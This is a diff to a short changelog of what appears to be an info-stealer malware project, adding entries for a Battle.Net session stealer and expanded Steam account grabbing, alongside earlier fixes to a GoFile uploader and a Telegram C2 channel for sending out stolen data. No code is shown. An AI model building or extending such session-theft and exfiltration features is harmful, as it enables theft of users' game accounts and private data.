@@ -1,4 +1,8 @@
 # Changelog
+### 20/07/2023
+* Added Battle.Net Session Stealer
+* Added new features to Steam Grabber (Game Count, Profile Information, Account Level) using the Steam Web API.
+
 ### 16/07/2023
 * Fixed GoFile uploader.
 * Fixed the bug where data is not being sent when C2 is Telegram and the file size exceeds the upload limit.
